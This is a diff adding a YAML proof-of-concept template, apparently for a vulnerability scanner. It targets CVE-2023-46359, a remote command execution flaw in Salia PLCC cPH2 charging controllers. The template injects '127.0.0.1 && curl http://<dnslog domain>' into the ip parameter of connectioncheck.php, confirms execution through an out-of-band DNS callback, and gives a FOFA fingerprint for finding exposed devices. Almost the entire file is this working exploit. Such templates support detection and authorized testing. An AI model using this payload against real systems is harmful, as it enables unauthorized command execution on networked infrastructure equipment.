@@ -1,0 +1,19 @@
+id: poc-yaml-salia-plcc-cph2-rce
+info:
+  name: Salia PLCC cPH2 远程命令执行漏洞(CVE-2023-46359)
+  severity: critical
+  tags:
+  - DNSLOG
+  - rce
+  - CVE-2023-46359
+  finger: salia plcc cph2
+  fofa: Salia PLCC
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+  payload: urlencode(concat(`127.0.0.1 && curl`,` http://`,domain))
+requests:
+- method: GET
+  path: /connectioncheck.php?ip={{.payload}}
+  expression: contains(body,"<b>SUCCESS</b>") && reverse.Verify()
+transport: http
